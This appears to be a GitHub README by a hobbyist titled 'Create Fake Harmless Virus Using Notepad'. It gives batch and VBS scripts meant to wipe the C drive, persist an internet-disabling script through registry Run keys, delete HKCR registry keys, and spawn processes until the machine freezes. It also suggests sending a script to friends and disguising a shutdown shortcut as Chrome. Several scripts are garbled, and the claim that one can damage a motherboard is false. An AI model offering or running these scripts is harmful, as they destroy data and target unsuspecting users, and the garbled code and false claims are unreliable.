# -VirusP1
Create Fake Harmless Virus Using Microsoft Windows Notepad

hi user , this will help you create a simple Fake virus.

#The virus is a malicious program that enters the computer without your permission and can affect your data and operating system.

#Steps :-

How to Create Fake Harmless Virus Using Notepad

Many of you will think the methods must be on coding, but nothing like that. The tricks are based on Notepad. Just follow the below steps for creating a harmless virus using a notepad. Additionally, you can remove malware from your browser if it is infected.

1) Creating a Dangerous Virus

1. First of all, in your Windows OS, open Notepad.
2. Copy and paste the code below into your notepad screen.

 
 @Echo off
Del C: *.* |y

3. Save this file as virus.bat (you can select any random name, but .bat must be there after that).
   
Now running the file will delete the C drive completely, and the operating system of the respective computer will get corrupted.

Note: This method is only for knowledge purposes. Don’t try this on your computer, as it will completely format your C drive.

2) Creating a Harmless Cdrom Virus
Open Notepad Paste the following code into it and save it as CD-ROM.vbs or anything (*.vbs_


Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 5000
loop

When you double-click on this file, you will be amazed at what this simple, harmless virus can do. Your CD/DVD drives will get continuously ejected.

To stop this virus, you need to open Task Manager, select the process tab, and end the wscript.exe file.

3) Create a Virus To Test Your Antivirus (fake virus notepad)

Open Notepad and paste the given code and save the file as “EICAR.COM”


X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

If you have an active antivirus, your antivirus program will remove this file in no time. This is the harmless virus used to check your antivirus’s security level.

4) Virus To Stop Someone’s Internet Access
This is a harmless virus, and it will not destroy your PC. You can use this notepad virus script to prank your friends. This virus stops anyone’s internet access. You need to type
the following code in Notepad.


@Echo off
Ipconfig /release


Save the file in a .bat format like internet.bat and send it to your friends. The IP address will be lost, so they won’t be able to fix it. Well, if you want to fix it. Type in ipconfig/renew. So, this is one of the best notepad virus pranks.

5) Creating a Matrix Type screen
Well, it’s not a virus. It is just a simple notepad trick that will let you see the string of green characters appearing randomly. It has nothing to do with your computer registry, batch, etc. However, you can use this trick to scare your friend because the screen looks like a virus is affected.

Open Notepad and type the following code into it.


code :-

@echo off
color 02
:start
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto start


Now save the file as** Matrix.bat**, click on it, and the show begins.

6) Shutdown virus
You can also create a virus that can shut down computers. This virus is harmless but can cause data loss due to a sudden shutdown. Here’s how you can make a shutdown virus to pull up a prank with your friends.

1. First of all, right-click on your desktop and then choose the option Create Shortcut.
2.  In the pop-up window, type in shutdown -s -t 60 -c “Virus Detection. The computer is shutting down.” Instead of 60, you can put what value you want. It represents the time in seconds
3. then click on the Next button and type Chrome. Or whatever you want.
4. Then, you need to change the Shortcut icon and choose the icon of Google Chrome
5. Your virus will look like Google Chrome. You can carry this file in your Pendrive and shut down your friends’ computers.

Few Other Notepad Virus Codes (Notepad virus tricks)
Here are a few other source codes to create a notepad virus on a Windows computer.

**Note: The damages caused by these viruses are irreversible**

*****************************************************************************************************************************************************************************************

1) Disable Internet Permanently

   The below code will disable anyone’s internet connectivity PERMANENTLY.

   [alert-note]echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho ENTER YOUR MESSAGE!!
PAUSE[/alert-note]

2) Endless Notepads
The below code will pop up endless notepads until the computer freezes and crashes!

@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top

3) Endless Enter
The below code will make the enter button pressed continuously

Set wshShell = wscript.CreateObject(”WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “~(enter)”
loop

4) Delete Key Registry Files
Before trying the notepad virus, please remember that this is a dangerous and unrecoverable virus that can cause permanent damage to your operating system. Reinstalling Windows is the only option to recover from this dangerous virus.

@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your PC has been crashed.Your Dad.
GOTO MESSAGE

5) App Bomber
This is another dangerous virus that can freeze a computer in no time. This virus will repeatedly open different applications, forcing the computer to freeze. This virus can also damage your motherboard, so try this at your own risk.

@echo off
:x
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x

****************************************************************************************** thankyou ************************************************************************************
**BY :- SABHAREESHWHARAN.S**

